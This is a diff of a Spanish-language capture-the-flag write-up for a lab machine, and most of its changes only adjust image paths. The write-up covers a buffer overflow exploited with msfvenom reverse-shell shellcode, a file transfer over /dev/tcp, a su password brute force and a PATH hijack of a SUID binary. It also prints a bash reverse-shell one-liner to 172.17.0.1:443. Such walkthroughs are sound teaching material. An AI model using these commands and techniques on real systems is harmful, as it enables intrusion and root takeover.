@@ -1,4 +1,4 @@
-___
+__
 - Tags: #máquina #bof #pathhijacking 
 ___
 # Reconocimiento 
@@ -15,7 +15,7 @@ nmap -p- --open --min-rate 5000 -sS -v -Pn -n 172.17.0.2 -oG allPorts
 
 Observamos que tan solo están abiertos los puertos **80, 20201**:
 
-![](<../../images/Pasted image 20240914165644.png>)
+![](<../images/Pasted image 20240914165644.png>)
 
 Gracias a la utilidad de [getPorts]() nos copiamos los puertos que se encuentran abiertos, y ahora volviendo a usar [Nmap](<../../🐱‍💻 Introducción al Hacking/🔎 Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) realizaremos un escaneo más exhaustivo sobre los puertos abiertos de la siguiente forma:
 
@@ -25,31 +25,31 @@ nmap -p80,20201 -sCV 172.17.0.2 -oN targeted
 
 Observamos que no nos reporta nada interesante:
 
-![](<../../images/Pasted image 20240914165727.png>)
+![](<../images/Pasted image 20240914165727.png>)
 
 ___
 # Explotación
 
 Como está abierto el puerto **80** nos dirigimos a la página web y vemos un botón **download** el cual si clicamos nos descarga un archivo llamado **secure_software**.
 
-![](<../../images/Pasted image 20240914165843.png>)
+![](<../images/Pasted image 20240914165843.png>)
 
 Vemos que se trata de un archivo ejecutable de **32bits**:
 
-![](<../../images/Pasted image 20240914170957.png>)
+![](<../images/Pasted image 20240914170957.png>)
 
 Si ejecutamos dicho archivo vemos que se pone en escucha por el puerto **20201** (*mismo puerto que estaba abierto en la máquina víctima*), y si intentamos acceder a través de [NetCat](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Consideraciones previas.md# NetCat>) vemos que podemos introducir data.
 
-![](<../../images/Pasted image 20240914165954.png>)
+![](<../images/Pasted image 20240914165954.png>)
 
 Si entramos a través del puerto que está abierto en la máquina observamos el mismo funcionamiento.
 
-![](<../../images/Pasted image 20240914170009.png>)
+![](<../images/Pasted image 20240914170009.png>)
 ## [Buffer OverFlow](<../../🐱‍💻 Introducción al Hacking/😎 Buffer OverFlow/Buffer OverFlow.md>)
 
 Probaremos a intentar un ataque de [Buffer OverFlow](<../../🐱‍💻 Introducción al Hacking/😎 Buffer OverFlow/Buffer OverFlow.md>) con el binario que nos hemos descargado, para ello debemos introducir muchos caracteres en el input y ver si peta la aplicación, observamos que peta la aplicación:
 
-![](<../../images/Pasted image 20240914170039.png>)
+![](<../images/Pasted image 20240914170039.png>)
 ### Sacar offset
 
 En el este punto lo más seguro es que sea vulnerable a un [Buffer OverFlow](<../../🐱‍💻 Introducción al Hacking/😎 Buffer OverFlow/Buffer OverFlow.md>) por lo que intentaremos sacar el **offset**, es decir la basura o junk que hay que introducir como input para que el programa pete, para poder realizar dicha acción nos abriremos el binario con gdb.
@@ -91,7 +91,7 @@ if __name__ == '__main__':
 
 En gdb ejecutaremos el binario para ponerlo en escucha con la instrucción `r` (run):
 
-![](<../../images/Pasted image 20240914170814.png>)
+![](<../images/Pasted image 20240914170814.png>)
 
 Ahora ejecutaremos el exploit con:
 
@@ -101,7 +101,7 @@ python3 exploit.py
 
 Observamos como el binario peta, por lo que debemos hacer ahora es copiarnos la dirección `0x41366a41` que corresponde al `Aj6A` en hexadecimal.
 
-![](<../../images/Pasted image 20240914170847.png>)
+![](<../images/Pasted image 20240914170847.png>)
 
 Ahora volviendo a usar una herramienta de [Metasploit](<../../🐱‍💻 Introducción al Hacking/➕ Material Adicional/Metasploit/Metasploit.md>) sacaremos el **offset** pasándole con el parámetro `-q` la dirección en hexadecimal.
 
@@ -111,7 +111,7 @@ Ahora volviendo a usar una herramienta de [Metasploit](<../../🐱‍💻 Introd
 
 Vemos que el **offset** es **288**.
 
-![](<../../images/Pasted image 20240914170909.png>)
+![](<../images/Pasted image 20240914170909.png>)
 ### Tomando control del EIP
 
 En este punto lo que debemos hacer es comprobar si tenemos control sobre el **EIP**, el cual se encarga de apuntar a la ubicación en la memoria donde se encuentra la siguiente instrucción del programa. Actualizaremos el exploit , estableciendo en la variable **before_eip** la basura que hay antes de llegar al **eip**, el cual vale `BBBB`, por lo que si vemos en el **gdb** `BBBB` tendremos control sobre el **EIP**.
@@ -145,12 +145,12 @@ if __name__ == '__main__':
 
 Volveremos a ponernos en escucha con `r` (run) y ejecutaremos el exploit. Observamos como ahora el **EIP** vale `BBBB` por lo que habremos tomado el control sobre el **EIP**.
 
-![](<../../images/Pasted image 20240914171109.png>)
+![](<../images/Pasted image 20240914171109.png>)
 ### Checksec
 
 En este punto en el gdb introduciremos la acción `checksec` para comprobar que protecciones tiene el binario, y vemos que **NX** (Not Executable/Not Execute) esta desactivado por lo que podemos cargar nuestro shellcode directamente en el binario.
 
-![](<../../images/Pasted image 20240914175835.png>)
+![](<../images/Pasted image 20240914175835.png>)
 
 En este punto lo que debemos hacer es hacer es ver a donde se dirige todo lo que introducimos después del **EIP**, para ello añadiremos la variable **after_eip**:
 
@@ -184,12 +184,12 @@ if __name__ == '__main__':
 
 Si ejecutamos `x/300wx $esp` para ver la información que hay en el pila vemos que nuestras **Cs** se están introduciendo al principio de la pila (stack), por lo que en este punto lo que debemos hacer es encontrar un **OpCode** el cual nos permita realizar un salto al **ESP**, es decir al principio de la pila.
 
-![](<../../images/Pasted image 20240914171320.png>)
+![](<../images/Pasted image 20240914171320.png>)
 #### Opcode
 
 Volveremos a usar una herramienta de [Metasploit](<../../🐱‍💻 Introducción al Hacking/➕ Material Adicional/Metasploit/Metasploit.md>) pero esta vez será para saber el **OpCode** del **JMP ESP**, y vemos que es **FFE4**.
 
-![](<../../images/Pasted image 20240914171402.png>)
+![](<../images/Pasted image 20240914171402.png>)
 
 Ahora usaremos **objdump** para saber cual es la dirección de memoria la cual nos permite realizar el **JMP ESP** y vemos que la dirección es `0x08049213`.
 
@@ -197,7 +197,7 @@ Ahora usaremos **objdump** para saber cual es la dirección de memoria la cual n
 objdump -d secure_software | grep "FF E4" -i
 ```
 
-![](<../../images/Pasted image 20240914171451.png>)
+![](<../images/Pasted image 20240914171451.png>)
 
 Usando **msfvenom** nos generaremos un shellcode el cual nos permita enviarnos una [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>), para ello podemos introducir el siguiente comando:
 
@@ -205,7 +205,7 @@ Usando **msfvenom** nos generaremos un shellcode el cual nos permita enviarnos u
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -b '\x00\x0a\x0d' -f py
 ```
 
-![](<../../images/Pasted image 20240914171733.png>)
+![](<../images/Pasted image 20240914171733.png>)
 
 Finalmente, lo que debemos hacer ahora es introducir la dirección de memoria del **JMP ESP** en la variable **EIP** para que se aplique dicho salto, destacar que debe de estar en formato little endian, además cargaremos nuestro shellcode el cual nos enviará una [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) al puerto **443**, y por último debemos añadir unos **NOPs** (`\x90`) antes de nuestro shellcode para que sea interpretado correctamente.
 
@@ -261,7 +261,7 @@ Si ejecutamos el script vemos como recibimos la [Reverse Shell](<../../🐱‍�
 
 > Parece magia 🔮
 
-![](<../../images/Pasted image 20240914172107.png>)
+![](<../images/Pasted image 20240914172107.png>)
 
 ____
 # Escalada de privilegios
@@ -277,21 +277,21 @@ Una vez ganado acceso a la máquina lo que debemos hacer es un [Tratamiento de l
 
 Vemos que en nuestro directorio home tenemos un hash en formato **MD5** pues tiene 32 caracteres.
 
-![](<../../images/Pasted image 20240914172303.png>)
+![](<../images/Pasted image 20240914172303.png>)
 
 Observamos que existe el usuario **johntheripper** existe en la máquina.
 
-![](<../../images/Pasted image 20240914172624.png>)
+![](<../images/Pasted image 20240914172624.png>)
 
 En este punto lo que intentaremos será crackearlo con **johntheripper**,  [Hashes](https://hashes.com/en/decrypt/hash) [CrackStation](https://crackstation.net/)u otras herramientas pero no tendremos éxito. 
 
 Si seguimos enumerando el sistema nos encontraremos con el archivo `/opt/.hidden/words` el cual contiene un listado de palabras.
 
-![](<../../images/Pasted image 20240914172655.png>)
+![](<../images/Pasted image 20240914172655.png>)
 
 Por lo que intentaremos aplicar fuerza bruta al usuario **johntheripper** para ello necesitamos un script de fuerza bruta como el sigueinte: [Su-bruteForce](https://github.com/TerrorAterrador/su-BruteForce), vemos que no tenemos **curl** o **wget** para [Transferirnos](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el script.
 
-![](<../../images/Pasted image 20240914172817.png>)
+![](<../images/Pasted image 20240914172817.png>)
 
 Deberemos usar el medio tradicional para [Transferirnos](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el archivo, es decir ejecutaremos el siguiente comando en la máquina atancate:
 
@@ -307,11 +307,11 @@ cat < /dev/tcp/172.17.0.1/443 > su-brute-force.sh
 
 Vemos como hemos conseguido [Transferirnos](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el script correctamente sin necesidad de usar **wget** o **curl**.
 
-![](<../../images/Pasted image 20240914172940.png>)
+![](<../images/Pasted image 20240914172940.png>)
 
 Ejecutaremos el script [Su-BruteForce](https://github.com/TerrorAterrador/su-BruteForce) para ver las opciones:
 
-![](<../../images/Pasted image 20240914172958.png>)
+![](<../images/Pasted image 20240914172958.png>)
 
 Una vez vistas las opciones ejecutaremos el script especificando el nombre de usuario **johntheripper** y el diccionario que hemos encontrado en `/opt/.hidden/words`.
 
@@ -321,23 +321,23 @@ Una vez vistas las opciones ejecutaremos el script especificando el nombre de us
 
 Observamos como nos reporta la contraseña de manera casi instantánea. 
 
-![](<../../images/Pasted image 20240914173013.png>)
+![](<../images/Pasted image 20240914173013.png>)
 
 Si probamos a autenticarnos observamos como hemos podido convertirnos en el usuario **johntheripper** de manera exitosa: 
 
-![](<../../images/Pasted image 20240914173031.png>)
+![](<../images/Pasted image 20240914173031.png>)
 
 En nuestro directorio home vemos que hay un archivo con permiso [SUID](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/Abusando de privilegios SUID/SUID.md>) donde el propietario es el **root**.
 
-![](<../../images/Pasted image 20240914173057.png>)
+![](<../images/Pasted image 20240914173057.png>)
 
 Vemos que al ejecutar dicho script nos lista los fichero que hay en el directorio actual:
 
-![](<../../images/Pasted image 20240914173120.png>)
+![](<../images/Pasted image 20240914173120.png>)
 
 > De manera adicional y para entender como funciona mejor este script nos lo transferimos a la máquina atacante y lo abriremos con **Ghydra**, en la función **main** veremos que está llamando a un comando a nivel de sistema ("ls") sin usar la ruta absoluta por lo que podremos intentar un [PATH Hijacking](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/PATH Hijacking/PATH Hijacking.md>).
 > 
-> ![](<../../images/Pasted image 20240914173155.png>)
+> ![](<../images/Pasted image 20240914173155.png>)
 
 En este punto lo que haremos será crear un fichero con permisos de ejecución y con el nombre `ls`.
 
@@ -347,11 +347,11 @@ Cambiaremos nuestra variable PATH para intentar un [PATH Hijacking](<../../🐱�
 export PATH=/home/johntheripper:$PATH
 ```
 
-![](<../../images/Pasted image 20240914173454.png>)
+![](<../images/Pasted image 20240914173454.png>)
 
 Volveremos a ejecutar el binario y vemos que nos muestra el output del comando **whoami**, pues dicho comando se encuentra definido dentro del ejecutable `ls`.
 
-![](<../../images/Pasted image 20240914173503.png>)
+![](<../images/Pasted image 20240914173503.png>)
 
 En este punto lo que debemos hacer es introducir el siguiente contenido en el ejecutable `ls` para enviarnos una [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>).
 
@@ -359,8 +359,8 @@ En este punto lo que debemos hacer es introducir el siguiente contenido en el ej
 bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
 ```
 
-![](<../../images/Pasted image 20240914173555.png>)
+![](<../images/Pasted image 20240914173555.png>)
 
 Nos pondremos en escucha con [Consideraciones previas](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Consideraciones previas.md# NetCat>) y al ejecutar el archivo `./showfiles` recibiremos la [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) como el usuario **root**.
 
-![](<../../images/Pasted image 20240914173701.png>)
+![](<../images/Pasted image 20240914173701.png>)
